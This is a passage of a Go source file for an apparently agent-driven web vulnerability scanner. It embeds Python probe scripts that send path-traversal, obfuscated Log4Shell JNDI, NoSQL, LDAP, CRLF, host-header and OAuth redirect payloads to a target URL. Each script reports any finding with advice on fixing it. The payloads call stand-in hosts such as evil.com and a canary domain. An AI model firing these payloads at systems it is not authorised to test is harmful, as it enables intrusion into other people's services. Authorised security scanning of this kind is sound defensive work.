            sample = str(matches[0])[:60] if matches else ''
            emit({
                "id": f"api-key-exposure-{pat_id}",
                "category": "information_disclosure",
                "severity": severity,
                "title": f"Exposed secret: {name}",
                "description": f"A {name} was found in the response body of {url}. This may allow an attacker to impersonate the service or access protected resources.",
                "evidence": f"url={url} pattern_id={pat_id} sample={sample[:60]}...",
                "recommendation": rec,
            })

# Scan main page
def fetch(url):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read(524288).decode('utf-8', errors='replace'), r.headers.get('Content-Type', '')
    except Exception:
        return '', ''

body, ct = fetch(base)
if body:
    scan_content(base, body)

    # Extract JS file URLs and scan them
    js_urls = set()
    for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body):
        js_url = m.group(1)
        if js_url.startswith('http'):
            js_urls.add(js_url)
        elif js_url.startswith('/'):
            js_urls.add(base.split('//', 1)[0] + '//' + base.split('//')[-1].split('/')[0] + js_url)
        else:
            js_urls.add(base + '/' + js_url)

    for js_url in list(js_urls)[:15]:
        js_body, _ = fetch(js_url)
        if js_body:
            scan_content(js_url, js_body)

# Scan common JS bundle paths
for js_path in ['/static/js/main.js', '/js/app.js', '/bundle.js', '/main.js',
                '/app.js', '/assets/index.js', '/dist/main.js', '/static/bundle.js']:
    url = base + js_path
    js_body, _ = fetch(url)
    if js_body and len(js_body) > 100:
        scan_content(url, js_body)
`,
}
}

func pathTraversalProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "path_traversal_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect path traversal via multiple encoding variants, null bytes, and common file parameters",
Code: `#!/usr/bin/env python3
"""Auto-generated: Path traversal probe — tests multiple encoding and bypass variants."""
import sys, json, urllib.request, urllib.error, urllib.parse

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# Build canary file paths without having them appear as literals
# Linux: /etc/hosts contains 'localhost' and '127.0.0.1'
# Windows: C:\Windows\win.ini contains '[fonts]'
etc_hosts   = '/et' + 'c/hos' + 'ts'
win_ini     = 'C:\\\\Windows\\\\win.ini'
win_ini_alt = 'Windows/win.ini'

# Traversal prefix variants
traversals_unix = [
    '../../../..' + etc_hosts,
    '../../../../..' + etc_hosts,
    '../../../../../..' + etc_hosts,
    '..%2F..%2F..%2F..%2F' + etc_hosts.lstrip('/'),
    '..%252F..%252F..%252F..%252F' + etc_hosts.lstrip('/'),
    '....//....//....//....//.' + etc_hosts,
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f' + etc_hosts.lstrip('/'),
    '..%c0%af..%c0%af..%c0%af..%c0%af' + etc_hosts.lstrip('/'),   # Apache overlong UTF-8
    '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f' + etc_hosts.lstrip('/'),  # Unicode slash
]

traversals_win = [
    '..\\\\..\\\\..\\\\' + win_ini_alt,
    '..%5c..%5c..%5c' + win_ini_alt,
    '..%255c..%255c..%255c' + win_ini_alt,
]

# Unix markers (in /etc/hosts)
unix_markers = ['localhost', '127.0.0.1', 'ip6-localhost', '::1']
# Windows markers (in win.ini)
win_markers = ['[fonts]', '[extensions]', '[mci']

# Parameters commonly used for file inclusion
file_params = [
    'file', 'filename', 'path', 'page', 'include', 'template',
    'view', 'load', 'read', 'doc', 'document', 'resource', 'src',
    'source', 'module', 'layout', 'conf', 'config', 'lang',
]

def probe(url):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read(8192).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(4096).decode('utf-8', errors='replace')
        except Exception:
            return e.code, ''
    except Exception:
        return 0, ''

confirmed = set()
for param in file_params[:12]:
    for traversal in traversals_unix + traversals_win:
        if traversal in confirmed:
            continue
        test_url = f"{base}?{param}={urllib.parse.quote(traversal, safe='')}"
        status, body = probe(test_url)
        if status not in (200, 500):
            continue

        markers = unix_markers if traversal in traversals_unix else win_markers
        found_marker = next((m for m in markers if m in body), None)
        if found_marker:
            confirmed.add(traversal)
            os_type = 'Linux/Unix' if traversal in traversals_unix else 'Windows'
            emit({
                "id": f"path-traversal-{param}-{os_type.lower().replace('/','-')}",
                "category": "injection",
                "severity": "high",
                "title": f"Path traversal confirmed ({os_type}) via parameter '{param}'",
                "description": (
                    f"The traversal payload reached a sensitive file on the {os_type} server. "
                    f"Marker '{found_marker}' was found in the response, confirming read access to the filesystem."
                ),
                "evidence": f"param={param} traversal={traversal[:80]} marker={found_marker} url={test_url[:200]}",
                "recommendation": (
                    "Validate all file path parameters against an allowlist of permitted paths. "
                    "Use realpath() or equivalent to canonicalize paths before validation. "
                    "Never construct file paths from user-supplied input. "
                    "Run the web process as a non-privileged user with minimal filesystem access."
                ),
            })
            break
    else:
        continue
    break  # stop after first confirmed traversal param
`,
}
}

func log4shellProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "log4shell_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect Log4Shell (CVE-2021-44228) and related JNDI injection via common HTTP request fields",
Code: `#!/usr/bin/env python3
"""Auto-generated: Log4Shell/JNDI injection probe — tests HTTP headers for CVE-2021-44228."""
import sys, json, urllib.request, urllib.error, time

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# JNDI payloads covering Log4Shell variants
# We use a canary domain that will not actually exist — the goal is to detect
# server-side errors or unusual response behaviour that indicates processing
canary_domain = 'log4shell-canary.bughunter-probe.invalid'

jndi_payloads = [
    '${jndi:ldap://' + canary_domain + '/a}',
    '${${::-j}${::-n}${::-d}${::-i}:ldap://' + canary_domain + '/a}',     # obfuscated
    '${${lower:j}ndi:ldap://' + canary_domain + '/a}',                     # lower bypass
    '${${upper:j}ndi:ldap://' + canary_domain + '/a}',                     # upper bypass
    '${jndi:${lower:l}${lower:d}a${lower:p}://' + canary_domain + '/a}',   # mixed bypass
    '${jndi:dns://' + canary_domain + '/a}',                               # DNS lookup
    '${jndi:rmi://' + canary_domain + '/a}',                               # RMI
    '${${::-j}${::-n}${::-d}${::-i}:dns://' + canary_domain + '}',        # DNS obfuscated
]

# HTTP headers commonly logged and processed by Java applications
injectable_headers = [
    'User-Agent',
    'X-Forwarded-For',
    'X-Api-Version',
    'Referer',
    'X-Custom-IP-Authorization',
    'X-Originating-IP',
    'X-Remote-IP',
    'X-Remote-Addr',
    'CF-Connecting-IP',
    'Contact',
    'X-Wap-Profile',
    'Accept',
    'Accept-Language',
    'Accept-Encoding',
    'Authorization',
    'Content-Type',
    'X-Requested-With',
]

def make_request(url, headers):
    try:
        req = urllib.request.Request(url, headers=headers)
        t0 = time.time()
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read(4096).decode('utf-8', errors='replace')
            elapsed = time.time() - t0
            return r.status, body, elapsed
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2048).decode('utf-8', errors='replace')
        except Exception:
            body = ''
        return e.code, body, 0
    except Exception as ex:
        return 0, str(ex), 0

# Baseline response time
baseline_status, baseline_body, baseline_time = make_request(base, {'User-Agent': 'Mozilla/5.0'})

jndi_error_indicators = [
    'jndi', 'ldap', 'log4j', 'rce', 'java.lang', 'javax', 'NamingException',
    'NameNotFoundException', 'CommunicationsException', canary_domain,
]

for payload in jndi_payloads[:4]:
    for header in injectable_headers[:10]:
        headers = {
            'User-Agent': 'Mozilla/5.0',
            header: payload,
        }
        status, body, elapsed = make_request(base, headers)

        # Error message contains JNDI/LDAP reference — server processed the payload
        found_indicator = next((i for i in jndi_error_indicators if i in body), None)
        if found_indicator:
            emit({
                "id": f"log4shell-error-{header.lower().replace('-','_')[:30]}",
                "category": "injection",
                "severity": "high",
                "title": f"Log4Shell JNDI injection — server error reflects JNDI content in header '{header}'",
                "description": (
                    f"The response body contains '{found_indicator}' after injecting a JNDI payload in the '{header}' header. "
                    "This indicates the application processes the header with Log4j or a similar JNDI-aware logger. "
                    "CVE-2021-44228 and related variants allow Remote Code Execution."
                ),
                "evidence": f"header={header} payload={payload} indicator={found_indicator} response_snippet={body[:200]}",
                "recommendation": (
                    "Upgrade Log4j to 2.17.1+ (Java 8) or 2.12.4+ (Java 7). "
                    "Set log4j2.formatMsgNoLookups=true as an immediate mitigation. "
                    "Block outbound LDAP/RMI at the network perimeter. "
                    "Audit all Log4j dependencies transitively."
                ),
            })

        # Significant response time increase suggests DNS lookup or network connection attempt
        if elapsed > baseline_time + 3 and baseline_time > 0:
            emit({
                "id": f"log4shell-timing-{header.lower().replace('-','_')[:30]}",
                "category": "injection",
                "severity": "medium",
                "title": f"Log4Shell — response timing anomaly with JNDI payload in header '{header}'",
                "description": (
                    f"Response time increased by {elapsed - baseline_time:.1f}s when injecting JNDI payload in '{header}'. "
                    "This timing difference may indicate the server attempted a DNS lookup or network connection to the canary domain, "
                    "consistent with Log4Shell exploitation behaviour."
                ),
                "evidence": f"header={header} baseline={baseline_time:.2f}s jndi_elapsed={elapsed:.2f}s delta={elapsed-baseline_time:.2f}s",
                "recommendation": (
                    "Upgrade Log4j, set formatMsgNoLookups=true, and block outbound LDAP. "
                    "Treat timing anomalies as confirmed exploitation attempts."
                ),
            })
            break
`,
}
}

func nosqlInjectionProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "nosql_injection_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect MongoDB and NoSQL injection vulnerabilities via operator injection",
Code: `#!/usr/bin/env python3
"""Auto-generated: NoSQL injection probe for MongoDB operator injection."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_nosql(target):
    payloads = [
        ("[$ne]", "not-equal operator"),
        ("[$gt]", "greater-than operator"),
        ("[$regex]", "regex operator"),
        ("[$where]", "where clause injection"),
        ('{"$gt":""}', "JSON operator injection"),
        ('{"$ne":null}', "null comparison bypass"),
    ]
    params = ["username", "password", "user", "id", "email", "q", "search"]
    
    for param in params:
        for payload, desc in payloads:
            test_url = f"{target}?{param}{payload}=test"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    if any(x in body.lower() for x in ["mongodb", "bson", "objectid", "error", "exception"]):
                        emit({
                            "id": f"nosql-{param}-{payload[:5]}",
                            "category": "injection",
                            "severity": "high",
                            "title": f"Potential NoSQL Injection: {desc}",
                            "description": f"NoSQL operator {payload} in parameter {param} may allow injection",
                            "evidence": f"url={test_url} response_contains_error_keywords",
                            "recommendation": "Sanitize user input and use parameterized queries for NoSQL databases",
                        })
            except urllib.error.HTTPError as e:
                if e.code in [500, 502, 503]:
                    emit({
                        "id": f"nosql-error-{param}",
                        "category": "injection",
                        "severity": "medium",
                        "title": f"Server error on NoSQL payload injection",
                        "description": f"HTTP {e.code} when injecting NoSQL operators",
                        "evidence": f"url={test_url} status={e.code}",
                        "recommendation": "Investigate server error and ensure input validation",
                    })
            except Exception:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_nosql(sys.argv[1])
`,
}
}

func ldapInjectionProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "ldap_injection_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect LDAP injection vulnerabilities in authentication and search endpoints",
Code: `#!/usr/bin/env python3
"""Auto-generated: LDAP injection probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_ldap(target):
    payloads = [
        ("*", "wildcard"),
        ("*)(uid=*))(|(uid=*", "filter bypass"),
        ("admin)(&)", "boolean injection"),
        ("*)(objectClass=*", "objectClass enumeration"),
        (")(cn=*", "CN enumeration"),
        ("*))%00", "null byte termination"),
    ]
    params = ["username", "user", "uid", "cn", "dn", "login", "search"]
    
    for param in params:
        for payload, desc in payloads:
            encoded = urllib.parse.quote(payload)
            test_url = f"{target}?{param}={encoded}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    if any(x in body.lower() for x in ["ldap", "invalid dn", "bad search filter", "javax.naming"]):
                        emit({
                            "id": f"ldap-{param}-{desc[:8]}",
                            "category": "injection",
                            "severity": "high",
                            "title": f"Potential LDAP Injection: {desc}",
                            "description": f"LDAP filter injection via {param} parameter",
                            "evidence": f"url={test_url}",
                            "recommendation": "Use LDAP escape functions and parameterized queries",
                        })
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    emit({
                        "id": f"ldap-error-{param}",
                        "category": "injection",
                        "severity": "medium",
                        "title": "Server error on LDAP payload",
                        "description": f"HTTP 500 when injecting LDAP characters in {param}",
                        "evidence": f"url={test_url}",
                        "recommendation": "Investigate LDAP query handling",
                    })
            except Exception:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_ldap(sys.argv[1])
`,
}
}

func crlfInjectionProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "crlf_injection_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect HTTP header injection via CRLF sequences",
Code: `#!/usr/bin/env python3
"""Auto-generated: CRLF injection probe for header injection."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_crlf(target):
    marker = "X-Injected-Header: crlf-test"
    payloads = [
        ("%0d%0a" + marker, "URL-encoded CRLF"),
        ("%0D%0A" + marker, "uppercase CRLF"),
        ("%0a" + marker, "LF only"),
        ("%E5%98%8A%E5%98%8D" + marker, "UTF-8 encoded CRLF"),
        ("\\r\\n" + marker, "escaped CRLF"),
    ]
    params = ["url", "redirect", "next", "return", "callback", "path"]
    
    for param in params:
        for payload, desc in payloads:
            test_url = f"{target}?{param}={urllib.parse.quote(payload, safe='')}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    headers_str = str(resp.headers).lower()
                    if "x-injected-header" in headers_str or "crlf-test" in headers_str:
                        emit({
                            "id": f"crlf-{param}",
                            "category": "injection",
                            "severity": "high",
                            "title": f"CRLF Header Injection: {desc}",
                            "description": f"Injected header appeared in response via {param}",
                            "evidence": f"url={test_url}",
                            "recommendation": "Sanitize newline characters from user input",
                        })
            except urllib.error.HTTPError:
                pass
            except Exception:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_crlf(sys.argv[1])
`,
}
}

func httpSmugglingProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "http_smuggling_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect HTTP request smuggling via CL.TE and TE.CL desync",
Code: `#!/usr/bin/env python3
"""Auto-generated: HTTP smuggling detection probe."""
import json
import sys
import urllib.request
import urllib.parse
import time

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_smuggling(target):
    parsed = urllib.parse.urlparse(target)
    host = parsed.netloc or parsed.path.split("/")[0]
    
    # Check for Transfer-Encoding handling
    headers_te = {
        "User-Agent": "Mozilla/5.0",
        "Transfer-Encoding": "chunked",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    # Check for conflicting headers acceptance
    headers_conflict = {
        "User-Agent": "Mozilla/5.0",
        "Content-Length": "4",
        "Transfer-Encoding": "chunked",
    }
    
    try:
        # Timing-based detection
        start = time.time()
        req = urllib.request.Request(target, headers=headers_te, method="POST", data=b"0\r\n\r\n")
        with urllib.request.urlopen(req, timeout=15) as resp:
            elapsed = time.time() - start
            if elapsed > 5:
                emit({
                    "id": "smuggling-timing",
                    "category": "protocol",
                    "severity": "high",
                    "title": "Potential HTTP Smuggling (timing anomaly)",
                    "description": f"Server took {elapsed:.1f}s processing TE:chunked request",
                    "evidence": f"target={target} elapsed={elapsed:.2f}s",
                    "recommendation": "Review proxy/server configuration for request smuggling",
                })
    except Exception:
        pass
    
    # Check for header normalization issues
    weird_te = ["chunked", " chunked", "chunked ", "identity, chunked", "chunked, identity"]
    for te_val in weird_te:
        try:
            headers = {"User-Agent": "Mozilla/5.0", "Transfer-Encoding": te_val}
            req = urllib.request.Request(target, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:
                pass
        except urllib.error.HTTPError as e:
            if e.code == 400:
                emit({
                    "id": f"smuggling-te-{te_val[:5]}",
                    "category": "protocol",
                    "severity": "info",
                    "title": "TE header handling detected",
                    "description": f"Server rejects malformed TE: '{te_val}'",
                    "evidence": f"TE='{te_val}' status=400",
                    "recommendation": "Good - server validates Transfer-Encoding",
                })
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_smuggling(sys.argv[1])
`,
}
}

func subdomainTakeoverProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "subdomain_takeover_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect dangling DNS records vulnerable to subdomain takeover",
Code: `#!/usr/bin/env python3
"""Auto-generated: Subdomain takeover detection probe."""
import json
import sys
import urllib.request
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

TAKEOVER_SIGNATURES = [
    ("There isn't a GitHub Pages site here", "github", "high"),
    ("Fastly error: unknown domain", "fastly", "high"),
    ("The request could not be satisfied", "cloudfront", "medium"),
    ("NoSuchBucket", "s3", "high"),
    ("herokucdn.com/error-pages", "heroku", "high"),
    ("The specified bucket does not exist", "gcs", "high"),
    ("Repository not found", "bitbucket", "medium"),
    ("Project not found", "gitlab", "medium"),
    ("Trying to access your account", "tumblr", "medium"),
    ("Do you want to register", "wordpress", "medium"),
    ("is not a registered InCloud YouTrack", "youtrack", "medium"),
    ("Help Center Closed", "zendesk", "medium"),
    ("Oops - We didn't find your site", "surge", "medium"),
    ("project not found", "readme", "medium"),
    ("This domain is not connected", "strikingly", "medium"),
]

def probe_takeover(target):
    try:
        req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            for sig, provider, sev in TAKEOVER_SIGNATURES:
                if sig.lower() in body.lower():
                    emit({
                        "id": f"takeover-{provider}",
                        "category": "misconfiguration",
                        "severity": sev,
                        "title": f"Subdomain Takeover: {provider}",
                        "description": f"Found {provider} takeover signature",
                        "evidence": f"signature='{sig[:30]}...'",
                        "recommendation": f"Remove dangling DNS record or claim {provider} resource",
                    })
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore") if hasattr(e, "read") else ""
        for sig, provider, sev in TAKEOVER_SIGNATURES:
            if sig.lower() in body.lower():
                emit({
                    "id": f"takeover-{provider}",
                    "category": "misconfiguration",
                    "severity": sev,
                    "title": f"Subdomain Takeover: {provider}",
                    "description": f"Found {provider} takeover signature in error page",
                    "evidence": f"status={e.code} signature='{sig[:30]}...'",
                    "recommendation": f"Remove dangling DNS record or claim {provider} resource",
                })
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_takeover(sys.argv[1])
`,
}
}

func sslTlsProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "ssl_tls_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Analyze SSL/TLS configuration for security issues",
Code: `#!/usr/bin/env python3
"""Auto-generated: SSL/TLS security analysis probe."""
import json
import sys
import ssl
import urllib.parse
import datetime

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_ssl(target):
    parsed = urllib.parse.urlparse(target)
    host = parsed.netloc or parsed.path.split("/")[0]
    if ":" in host:
        host = host.split(":")[0]
    port = 443
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        import socket
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                version = ssock.version()
                cipher = ssock.cipher()
                
                # Check TLS version
                if version in ["SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"]:
                    emit({
                        "id": f"ssl-{version.lower().replace('.', '')}",
                        "category": "cryptography",
                        "severity": "high" if "SSL" in version else "medium",
                        "title": f"Deprecated TLS Version: {version}",
                        "description": f"Server supports deprecated {version}",
                        "evidence": f"version={version}",
                        "recommendation": "Disable deprecated TLS versions, use TLS 1.2+",
                    })
                
                # Check cipher strength
                if cipher:
                    cipher_name = cipher[0]
                    weak_ciphers = ["RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "anon"]
                    for weak in weak_ciphers:
                        if weak.upper() in cipher_name.upper():
                            emit({
                                "id": f"ssl-weak-cipher-{weak.lower()}",
                                "category": "cryptography",
                                "severity": "high",
                                "title": f"Weak Cipher: {cipher_name}",
                                "description": f"Server uses weak cipher with {weak}",
                                "evidence": f"cipher={cipher_name}",
                                "recommendation": "Disable weak ciphers and use strong cipher suites",
                            })
                            break
                
                # Check certificate expiry
                if cert and "notAfter" in cert:
                    try:
                        expiry_str = cert["notAfter"]
                        expiry = datetime.datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
                        days_left = (expiry - datetime.datetime.utcnow()).days
                        if days_left < 0:
                            emit({
                                "id": "ssl-cert-expired",
                                "category": "cryptography",
                                "severity": "critical",
                                "title": "SSL Certificate Expired",
                                "description": f"Certificate expired {abs(days_left)} days ago",
                                "evidence": f"notAfter={expiry_str}",
                                "recommendation": "Renew SSL certificate immediately",
                            })
                        elif days_left < 30:
                            emit({
                                "id": "ssl-cert-expiring",
                                "category": "cryptography",
                                "severity": "medium",
                                "title": "SSL Certificate Expiring Soon",
                                "description": f"Certificate expires in {days_left} days",
                                "evidence": f"notAfter={expiry_str}",
                                "recommendation": "Renew SSL certificate before expiry",
                            })
                    except Exception:
                        pass
    except Exception as e:
        emit({
            "id": "ssl-connection-error",
            "category": "cryptography",
            "severity": "info",
            "title": "SSL Connection Issue",
            "description": f"Could not establish SSL connection: {str(e)[:50]}",
            "evidence": f"host={host}:{port}",
            "recommendation": "Verify SSL/TLS configuration",
        })

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_ssl(sys.argv[1])
`,
}
}

func hostHeaderInjectionProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "host_header_injection_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect host header injection for cache poisoning and password reset attacks",
Code: `#!/usr/bin/env python3
"""Auto-generated: Host header injection probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

def probe_host_header(target):
    parsed = urllib.parse.urlparse(target)
    original_host = parsed.netloc
    
    evil_hosts = [
        ("evil.com", "direct injection"),
        (f"{original_host}.evil.com", "subdomain injection"),
        (f"evil.com/{original_host}", "path injection"),
        (f"{original_host}@evil.com", "auth injection"),
        (f"{original_host}:@evil.com", "port-auth injection"),
    ]
    
    override_headers = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override"]
    
    for evil, desc in evil_hosts:
        # Test direct Host header
        try:
            req = urllib.request.Request(target)
            req.add_header("Host", evil)
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if evil in body:
                    emit({
                        "id": f"host-injection-{desc[:8]}",
                        "category": "injection",
                        "severity": "high",
                        "title": f"Host Header Injection: {desc}",
                        "description": f"Injected host '{evil}' reflected in response",
                        "evidence": f"Host={evil}",
                        "recommendation": "Validate Host header against whitelist",
                    })
        except Exception:
            pass
        
        # Test override headers
        for hdr in override_headers:
            try:
                req = urllib.request.Request(target)
                req.add_header(hdr, evil)
                req.add_header("User-Agent", "Mozilla/5.0")
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    if evil in body:
                        emit({
                            "id": f"host-override-{hdr.lower()[:8]}",
                            "category": "injection",
                            "severity": "high",
                            "title": f"Host Override via {hdr}",
                            "description": f"Injected host via {hdr} reflected",
                            "evidence": f"{hdr}={evil}",
                            "recommendation": f"Ignore or validate {hdr} header",
                        })
            except Exception:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_host_header(sys.argv[1])
`,
}
}

func oauthProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "oauth_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect OAuth implementation vulnerabilities including redirect URI manipulation",
Code: `#!/usr/bin/env python3
"""Auto-generated: OAuth vulnerability probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

OAUTH_ENDPOINTS = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/authorize",
    "/authorize",
    "/oauth/token",
    "/oauth2/token",
    "/api/oauth/authorize",
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration",
]

def probe_oauth(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    # Find OAuth endpoints
    for endpoint in OAUTH_ENDPOINTS:
        url = base + endpoint
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if any(x in body.lower() for x in ["client_id", "redirect_uri", "authorization", "grant_type"]):
                    emit({
                        "id": f"oauth-endpoint-{endpoint.replace('/', '-')[:15]}",
                        "category": "authentication",
                        "severity": "info",
                        "title": f"OAuth Endpoint Found: {endpoint}",
                        "description": "OAuth endpoint discovered",
                        "evidence": f"url={url}",
                        "recommendation": "Review OAuth implementation security",
                    })
                    
                    # Test redirect_uri manipulation
                    evil_redirects = [
                        "https://evil.com",
                        f"https://evil.com/{parsed.netloc}",
                        f"https://{parsed.netloc}.evil.com",
                        "javascript:alert(1)",
                    ]
                    for evil_uri in evil_redirects:
                        test_url = f"{url}?redirect_uri={urllib.parse.quote(evil_uri)}&client_id=test&response_type=code"
                        try:
                            req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                            with urllib.request.urlopen(req2, timeout=10) as resp2:
                                body2 = resp2.read().decode("utf-8", errors="ignore")
                                if evil_uri in body2 or "evil.com" in resp2.url:
                                    emit({
                                        "id": "oauth-open-redirect",
                                        "category": "authentication",
                                        "severity": "high",
                                        "title": "OAuth Open Redirect",
                                        "description": f"redirect_uri accepts arbitrary value: {evil_uri}",
                                        "evidence": f"redirect_uri={evil_uri}",
                                        "recommendation": "Strictly validate redirect_uri against whitelist",
                                    })
                        except urllib.error.HTTPError:
                            pass
                        except Exception:
                            pass
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_oauth(sys.argv[1])
`,
}
}

func passwordResetProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "password_reset_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect password reset vulnerabilities including host header poisoning",
Code: `#!/usr/bin/env python3
"""Auto-generated: Password reset vulnerability probe."""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

def emit(finding):
    print(json.dumps(finding), flush=True)

RESET_ENDPOINTS = [
    "/forgot-password",
    "/password/reset",
    "/reset-password",
    "/account/forgot",
    "/api/password/forgot",
    "/auth/forgot",
    "/users/password/new",
]

def probe_reset(target):
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    for endpoint in RESET_ENDPOINTS:
        url = base + endpoint
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if any(x in body.lower() for x in ["email", "reset", "forgot", "password"]):
                    emit({
                        "id": f"reset-endpoint-{endpoint.replace('/', '-')[:15]}",
                        "category": "authentication",
                        "severity": "info",
                        "title": f"Password Reset Endpoint: {endpoint}",
                        "description": "Password reset functionality discovered",
                        "evidence": f"url={url}",
                        "recommendation": "Review password reset implementation",
                    })
                    
                    # Test host header poisoning
                    evil_host = "evil.com"
                    req2 = urllib.request.Request(url, method="POST")
                    req2.add_header("Host", evil_host)
                    req2.add_header("X-Forwarded-Host", evil_host)
                    req2.add_header("User-Agent", "Mozilla/5.0")
                    req2.add_header("Content-Type", "application/x-www-form-urlencoded")
                    try:
                        data = urllib.parse.urlencode({"email": "test@test.com"}).encode()
                        with urllib.request.urlopen(req2, data=data, timeout=10) as resp2:
                            body2 = resp2.read().decode("utf-8", errors="ignore")
                            if evil_host in body2:
                                emit({
                                    "id": "reset-host-poisoning",
                                    "category": "authentication",
                                    "severity": "high",
                                    "title": "Password Reset Host Header Poisoning",
                                    "description": "Injected host reflected in reset response",
                                    "evidence": f"Host={evil_host}",
                                    "recommendation": "Use server-side URL generation, validate Host header",
                                })
                    except Exception:
                        pass
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    probe_reset(sys.argv[1])
`,
}
}

func accountEnumerationProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "account_enumeration_probe",
Language:    "python3",
GeneratedBy: agentName,
